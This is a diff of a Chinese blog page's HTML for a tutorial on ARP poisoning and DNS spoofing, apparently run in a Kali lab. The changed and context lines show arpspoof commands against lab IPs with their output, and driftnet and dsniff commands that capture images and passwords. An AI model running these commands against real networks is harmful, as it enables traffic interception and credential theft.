@@ -129,7 +129,7 @@
 <meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-2.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-3.jpg">
 <meta property="og:image" content="http://orleven.orleven.com/images/arpspoof/arpspoof-4.png">
-<meta property="og:updated_time" content="2018-03-09T17:16:35.747Z">
+<meta property="og:updated_time" content="2018-03-11T05:59:12.178Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="中间人攻击——ARP毒化与DNS毒化">
 <meta name="twitter:description" content="概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。">
@@ -466,7 +466,7 @@
 <p>查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。</p>
 <h2 id="Dsniff"><a href="#Dsniff" class="headerlink" title="Dsniff"></a>Dsniff</h2><p>Dsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Msgsnarf</div><div class="line">Urlsnarf</div><div class="line">Mailsnarf</div><div class="line">Filesnarf</div><div class="line">dnsspoof</div></pre></td></tr></table></figure>
-<h3 id="arpspoof重定向受害者的流量传送给攻击者。"><a href="#arpspoof重定向受害者的流量传送给攻击者。" class="headerlink" title="arpspoof重定向受害者的流量传送给攻击者。"></a>arpspoof重定向受害者的流量传送给攻击者。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">......</div></pre></td></tr></table></figure>
+<h3 id="arpspoof重定向受害者的流量传送给攻击者。"><a href="#arpspoof重定向受害者的流量传送给攻击者。" class="headerlink" title="arpspoof重定向受害者的流量传送给攻击者。"></a>arpspoof重定向受害者的流量传送给攻击者。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.2</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">0:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9</div><div class="line">......</div></pre></td></tr></table></figure>
 <h3 id="arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）"><a href="#arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）" class="headerlink" title="arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）"></a>arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.183</div><div class="line">0:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9</div><div class="line">0:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9</div><div class="line">......</div></pre></td></tr></table></figure>
 <h3 id="截获敏感信息"><a href="#截获敏感信息" class="headerlink" title="截获敏感信息"></a>截获敏感信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# driftnet -i eth0 // 截获图片</div><div class="line">root@kali:~# dsniff  -i eth0 // 截获密码</div></pre></td></tr></table></figure>
 <h1 id="DNS毒化"><a href="#DNS毒化" class="headerlink" title="DNS毒化"></a>DNS毒化</h1><p>DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。<br>使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。</p>
@@ -677,11 +677,11 @@
             <ul class="links-of-blogroll-list">
               
                 <li class="links-of-blogroll-item">
-                  <a href="https://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
+                  <a href="http://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="https://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
+                  <a href="http://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
                 </li>
               
             </ul>
